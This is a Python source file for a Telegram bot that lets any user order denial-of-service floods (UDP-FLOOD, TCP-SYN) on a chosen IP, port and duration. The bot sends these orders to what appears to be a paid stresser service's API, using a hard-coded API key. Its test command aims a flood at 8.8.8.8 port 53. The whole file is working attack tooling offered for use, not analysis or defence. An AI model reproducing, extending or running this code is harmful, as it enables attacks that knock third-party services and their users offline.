# app.py - MINIMAL WORKING VERSION WITH FIXED CONCURRENT=2

import os
import logging
import asyncio
import aiohttp
import json
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
API_URL = os.getenv("API_URL", "https://mrstresser.com/api")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))

# FIXED - ALWAYS 2
CONCURRENT = 2
MIN_DURATION = 30
MAX_DURATION = 300

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ATTACK FUNCTION - EXACT MATCH TO WORKING URL =====
async def send_attack(target, port, duration, method="UDP-FLOOD"):
    """Send attack with EXACT format that works"""
    
    # Build parameters EXACTLY like the working URL
    params = {
        "key": API_KEY,
        "host": target,
        "port": str(port),
        "time": str(duration),
        "method": method,  # UDP-FLOOD works!
        "concs": str(CONCURRENT)  # ALWAYS 2
    }
    
    # Log what we're sending
    full_url = f"{API_URL}?{'&'.join([f'{k}={v}' for k, v in params.items()])}"
    logger.info("=" * 60)
    logger.info("🚀 SENDING ATTACK")
    logger.info(f"📡 FULL URL: {full_url}")
    logger.info(f"🔄 CONCURRENT: {CONCURRENT}")
    logger.info("=" * 60)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(API_URL, params=params, headers=headers) as response:
                response_text = await response.text()
                
                try:
                    response_data = json.loads(response_text)
                except:
                    response_data = {"raw": response_text}
                
                logger.info(f"📊 RESPONSE: {response.status} - {response_text[:200]}")
                
                if response.status == 200:
                    return {
                        "success": True,
                        "status": response.status,
                        "data": response_data,
                        "raw": response_text
                    }
                else:
                    return {
                        "success": False,
                        "status": response.status,
                        "data": response_data,
                        "raw": response_text
                    }
    except Exception as e:
        logger.error(f"❌ Error: {e}")
        return {"success": False, "error": str(e)}

# ===== TELEGRAM COMMANDS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🤖 *GURU BOT*\n\n"
        f"🔄 Concurrent: **{CONCURRENT}** (FIXED)\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
        f"📡 Default: UDP-FLOOD\n\n"
        f"Usage: `/attack IP PORT TIME`\n"
        f"Example: `/attack 8.8.8.8 43 30`\n"
        f"With method: `/attack 8.8.8.8 43 30 TCP-SYN`",
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if len(args) < 3:
        await update.message.reply_text(
            f"❌ Usage: `/attack IP PORT TIME [METHOD]`\n"
            f"Example: `/attack 8.8.8.8 43 30`\n"
            f"With method: `/attack 8.8.8.8 43 30 TCP-SYN`"
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        method = "UDP-FLOOD"
        if len(args) > 3:
            method = args[3].upper()
        
        if duration < MIN_DURATION or duration > MAX_DURATION:
            await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
            return
        
        # Send the attack
        await update.message.reply_text(
            f"⏳ Sending attack...\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: `{duration}s`\n"
            f"🔄 Concurrent: **{CONCURRENT}**\n"
            f"📡 Method: `{method}`",
            parse_mode='Markdown'
        )
        
        result = await send_attack(target, port, duration, method)
        
        if result.get('success'):
            attack_id = result.get('data', {}).get('attack_id', 'N/A')
            await update.message.reply_text(
                f"✅ *ATTACK SENT!*\n\n"
                f"🎯 Target: `{target}:{port}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"🔄 Concurrent: **{CONCURRENT}**\n"
                f"📡 Method: `{method}`\n"
                f"🆔 Attack ID: `{attack_id}`\n"
                f"📊 Status: SUCCESS",
                parse_mode='Markdown'
            )
        else:
            error = result.get('error', result.get('raw', 'Unknown error'))
            await update.message.reply_text(
                f"❌ *ATTACK FAILED*\n\n"
                f"Error: `{error[:200]}`",
                parse_mode='Markdown'
            )
            
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid port or time: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test the API with the exact URL format"""
    await update.message.reply_text("🔍 Testing API with `concs=2`...")
    
    result = await send_attack("8.8.8.8", 53, 30, "UDP-FLOOD")
    
    if result.get('success'):
        await update.message.reply_text(
            f"✅ *API TEST PASSED*\n\n"
            f"🔄 Concurrent: **{CONCURRENT}**\n"
            f"📊 Response: `{result.get('data', {})}`",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ *API TEST FAILED*\n\n"
            f"Error: `{result.get('error', result.get('raw', 'Unknown'))}`",
            parse_mode='Markdown'
        )

# ===== MAIN =====
def main():
    if not TELEGRAM_TOKEN:
        print("❌ TELEGRAM_TOKEN not set!")
        return
    
    print("=" * 50)
    print("🔥 GURU BOT - FIXED CONCURRENT=2")
    print(f"🔄 Concurrent: {CONCURRENT} (FIXED)")
    print("=" * 50)
    
    # Create application
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("test", test_command))
    
    # Start bot
    print("✅ Bot started! Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()